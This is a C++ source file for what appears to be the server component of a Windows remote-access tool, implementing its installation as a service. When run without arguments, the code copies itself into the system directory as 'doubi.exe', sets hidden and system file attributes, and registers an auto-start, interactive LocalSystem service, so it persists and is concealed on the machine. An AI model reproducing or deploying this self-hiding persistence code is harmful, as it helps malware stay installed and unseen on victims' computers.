#include "stdafx.h"
#include "server.h"
#include "serverDlg.h"
#include "resource.h"	
#include <excpt.h>
extern CserverApp theApp;

#ifndef _CRTAPI1
#if	_MSC_VER >= 800 && _M_IX86 >= 300
#define _CRTAPI1 __cdecl
#else
#define _CRTAPI1
#endif
#endif

// var 

SERVICE_STATUS          ssStatus;       // current status of the service
SERVICE_STATUS_HANDLE   sshStatusHandle;
DWORD                   dwErr = 0;
TCHAR                   szErr[256];
BOOL					bDebug = FALSE;
// fun
VOID WINAPI service_ctrl(DWORD dwCtrlCode);
VOID WINAPI service_main(DWORD dwArgc, LPTSTR *lpszArgv);
VOID CmdSetup();
VOID CmdRemoveService();
static BOOL service_is_exist();
VOID CmdDebugService();
BOOL WINAPI ControlHandler ( DWORD dwCtrlType );
LPTSTR GetLastErrorText( LPTSTR lpszBuf, DWORD dwSize );
BOOL ReportStatusToSCMgr(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint);
void ServiceStart();
void ServiceStop();

void _CRTAPI1 main(int argc, char **argv)
{
	theApp.SZSERVICENAME.LoadString(IDS_STRING_SERVICENAME);
	theApp.SZSERVICEDISPLAYNAME.LoadString(IDS_STRING_SERVICEDISPLAYNAME);
    SERVICE_TABLE_ENTRY dispatchTable[] =
    {
        { TEXT((LPTSTR)(LPCTSTR)theApp.SZSERVICENAME), (LPSERVICE_MAIN_FUNCTION)service_main },
        { NULL, NULL }
    };



    if ( (argc > 1) && ((*argv[1] == '-') || (*argv[1] == '/')) ) {
        if ( _stricmp( "install", argv[1]+1 ) == 0 )
        {
				//MessageBox(NULL,"1","123",MB_OK);
            CmdSetup();
        }
        else if ( _stricmp( "remove", argv[1]+1 ) == 0 )
       {
			//MessageBox(NULL,"2","123",MB_OK);
            CmdRemoveService();
        }
        else if ( _stricmp( "debug", argv[1]+1 ) == 0 )
        {
            bDebug = TRUE;
			//MessageBox(NULL,"3","123",MB_OK);
            CmdDebugService();
        }
		else {
			goto dispatch;
		}
        exit(0);
       
    }
dispatch:
	if (!StartServiceCtrlDispatcher(dispatchTable)) {   
		bDebug = TRUE;
		if (!service_is_exist()) CmdSetup();
		MessageBox(NULL,"hello,baby","123",MB_OK);
		CmdDebugService();
	}
}

static BOOL service_is_exist()
{
	char SubKey[MAX_PATH]={0};
	strcpy(SubKey,"SYSTEM\\CurrentControlSet\\Services\\");
	strcat(SubKey,TEXT(theApp.SZSERVICENAME));
		
	HKEY hKey;
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,SubKey,0L,KEY_ALL_ACCESS,&hKey) == ERROR_SUCCESS)
		return TRUE;
	else
		return FALSE;
}
void CmdSetup()
{	
    SC_HANDLE   schService;
    SC_HANDLE   schSCManager;

    TCHAR FilePath[512];
	TCHAR SystemPath[MAX_PATH];
	TCHAR FileTitle[80];

    if ( GetModuleFileName( NULL, FilePath, 512 ) == 0 )
    {
        _tprintf(TEXT("Unable to install %s - %s\n"), TEXT(theApp.SZSERVICENAME), GetLastErrorText(szErr, 256));
        return;
    }

	GetSystemDirectory(SystemPath,MAX_PATH);
	GetFileTitle(FilePath,FileTitle,80);
	if (strstr(FileTitle,".exe") == NULL && strstr(FileTitle,".EXE") == NULL)
			strcat(FileTitle,".exe");
	strcat(SystemPath,"\\");
	strcat(SystemPath,"doubi.exe");
	if (strncmp(SystemPath,FilePath,strlen(SystemPath)) != 0)
	{	 
		CopyFile(FilePath,SystemPath,FALSE);
		memset(FilePath,0,MAX_PATH);
		strcpy(FilePath,SystemPath);
	} 
    SetFileAttributes (FilePath,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);//
    schSCManager = OpenSCManager(
                        NULL,                   // machine (NULL == local)
                        NULL,                   // database (NULL == default)
                        SC_MANAGER_ALL_ACCESS   // access required
                        );
    if ( schSCManager )
    {
        schService = CreateService(
            schSCManager,               // SCManager database
            TEXT(theApp.SZSERVICENAME),        // name of service
            TEXT(theApp.SZSERVICEDISPLAYNAME), // name to display
            SERVICE_ALL_ACCESS,         // desired access
            SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS,  // service type
            SERVICE_AUTO_START,         // start type
            SERVICE_ERROR_NORMAL,       // error control type
            FilePath,                     // service's binary
            NULL,                       // no load ordering group
            NULL,                       // no tag identifier
            TEXT(""),					// dependencies
            NULL,                       // LocalSystem account
            NULL);                      // no password

        if ( schService )
        {
            _tprintf(TEXT("%s installed.\n"), TEXT(theApp.SZSERVICEDISPLAYNAME) );
            CloseServiceHandle(schService);
        }
        else
        {
            _tprintf(TEXT("CreateService failed - %s\n"), GetLastErrorText(szErr, 256));
        }

        CloseServiceHandle(schSCManager);
    }
    else
        _tprintf(TEXT("OpenSCManager failed - %s\n"), GetLastErrorText(szErr,256));
}

void CmdRemoveService()
{
    SC_HANDLE   schService;
    SC_HANDLE   schSCManager;
	printf("heheheh");
    schSCManager = OpenSCManager(
                        NULL,                   // machine (NULL == local)
                        NULL,                   // database (NULL == default)
                        SC_MANAGER_ALL_ACCESS   // access required
                        );
    if ( schSCManager )
    {
        schService = OpenService(schSCManager, TEXT(theApp.SZSERVICENAME), SERVICE_ALL_ACCESS);
		printf("heheheh");
        if (schService)
        {
            // try to stop the service
            if ( ControlService( schService, SERVICE_CONTROL_STOP, &ssStatus ) )
            {
                _tprintf(TEXT("Stopping %s."), TEXT(theApp.SZSERVICEDISPLAYNAME));
                Sleep( 1000 );

                while( QueryServiceStatus( schService, &ssStatus ) )
                {
                    if ( ssStatus.dwCurrentState == SERVICE_STOP_PENDING )
                    {
                        _tprintf(TEXT("."));
                        Sleep( 1000 );
                    }
                    else
                        break;
                }

                if ( ssStatus.dwCurrentState == SERVICE_STOPPED )
                    _tprintf(TEXT("\n%s stopped.\n"), TEXT(theApp.SZSERVICEDISPLAYNAME) );
                else
                    _tprintf(TEXT("\n%s failed to stop.\n"), TEXT(theApp.SZSERVICEDISPLAYNAME) );

            }

            // now remove the service
            if( DeleteService(schService) )
                _tprintf(TEXT("%s removed.\n"), TEXT(theApp.SZSERVICEDISPLAYNAME) );
            else
                _tprintf(TEXT("DeleteService failed - %s\n"), GetLastErrorText(szErr,256));


            CloseServiceHandle(schService);
        }
        else
            _tprintf(TEXT("OpenService failed - %s\n"), GetLastErrorText(szErr,256));

        CloseServiceHandle(schSCManager);
    }
    else
        _tprintf(TEXT("OpenSCManager failed - %s\n"), GetLastErrorText(szErr,256));
}

void CmdDebugService()
{

  //  SetConsoleCtrlHandler( ControlHandler, TRUE );

    ServiceStart();
}

BOOL WINAPI ControlHandler ( DWORD dwCtrlType )
{
    switch( dwCtrlType )
    {
        case CTRL_BREAK_EVENT:  // use Ctrl+C or Ctrl+Break to simulate
        case CTRL_C_EVENT:      // SERVICE_CONTROL_STOP in debug mode
            _tprintf(TEXT("Stopping %s.\n"), TEXT(theApp.SZSERVICEDISPLAYNAME));
            ServiceStop();
            return TRUE;
            break;

    }
    return FALSE;
}

void ServiceStart() {
	ReportStatusToSCMgr( SERVICE_RUNNING, NO_ERROR, 0 );
	CserverDlg dlg;
	theApp.m_pMainWnd = &dlg;
	INT_PTR nResponse = dlg.DoModal();
	if (nResponse == IDOK)
	{
		// TODO: 在此放置处理何时用
		//  “确定”来关闭对话框的代码
		
	}
	else if (nResponse == IDCANCEL)
	{
		// TODO: 在此放置处理何时用
		//  “取消”来关闭对话框的代码
	}
	 
}

VOID ServiceStop()
{
	((CserverDlg*)theApp.m_pMainWnd)->EndDialog( 0L );
}


//服务函数
void WINAPI service_main(DWORD dwArgc, LPTSTR *lpszArgv)
{

    // register our service control handler:
    //
    sshStatusHandle = RegisterServiceCtrlHandler( TEXT(theApp.SZSERVICENAME), service_ctrl);
    if (!sshStatusHandle)
        return;

    // SERVICE_STATUS members that don't change in example
    ssStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS; 
    ssStatus.dwServiceSpecificExitCode = 0;


    // report the status to the service control manager.
    if (ReportStatusToSCMgr(
        SERVICE_START_PENDING, // service state
        NO_ERROR,              // exit code
        3000)) {// wait hint
			ServiceStart( );
	}

    // try to report the stopped status to the service control manager.
    if (sshStatusHandle)
        (VOID)ReportStatusToSCMgr(
                            SERVICE_STOPPED,
                            dwErr,
                            0);

    return;
}

BOOL ReportStatusToSCMgr(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint) {
    static DWORD dwCheckPoint = 1;
    BOOL fResult = TRUE;


    if ( !bDebug ) // when debugging we don't report to the SCM
    {
        if (dwCurrentState == SERVICE_START_PENDING)
            ssStatus.dwControlsAccepted = 0;
        else
            ssStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

        ssStatus.dwCurrentState = dwCurrentState;
        ssStatus.dwWin32ExitCode = dwWin32ExitCode;
        ssStatus.dwWaitHint = dwWaitHint;

        if ( ( dwCurrentState == SERVICE_RUNNING ) ||
             ( dwCurrentState == SERVICE_STOPPED ) )
            ssStatus.dwCheckPoint = 0;
        else
            ssStatus.dwCheckPoint = dwCheckPoint++;


        // Report the status of the service to the service control manager.
        fResult = SetServiceStatus( sshStatusHandle, &ssStatus);
    }
    return fResult;
}

VOID WINAPI service_ctrl(DWORD dwCtrlCode)
{
    // Handle the requested control code.
    //
    switch(dwCtrlCode)
    {
        case SERVICE_CONTROL_STOP:
            ReportStatusToSCMgr(SERVICE_STOP_PENDING, NO_ERROR, 0);
            ServiceStop();
            return;

        // Update the service status.
        //
        case SERVICE_CONTROL_INTERROGATE:
            break;

        // invalid control code
        //
        default:
            break;

    }

    ReportStatusToSCMgr(ssStatus.dwCurrentState, NO_ERROR, 0);
}

LPTSTR GetLastErrorText( LPTSTR lpszBuf, DWORD dwSize )
{
    DWORD dwRet;
    LPTSTR lpszTemp = NULL;

    dwRet = FormatMessage( FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM |FORMAT_MESSAGE_ARGUMENT_ARRAY,
                           NULL,
                           GetLastError(),
                           LANG_NEUTRAL,
                           (LPTSTR)&lpszTemp,
                           0,
                           NULL );

    // supplied buffer is not long enough
    if ( !dwRet || ( (long)dwSize < (long)dwRet+14 ) )
        lpszBuf[0] = TEXT('\0');
    else
    {
        lpszTemp[lstrlen(lpszTemp)-2] = TEXT('\0');  //remove cr and newline character
        _stprintf( lpszBuf, TEXT("%s (0x%x)"), lpszTemp, GetLastError() );
    }

    if ( lpszTemp )
        LocalFree((HLOCAL) lpszTemp );

    return lpszBuf;
}
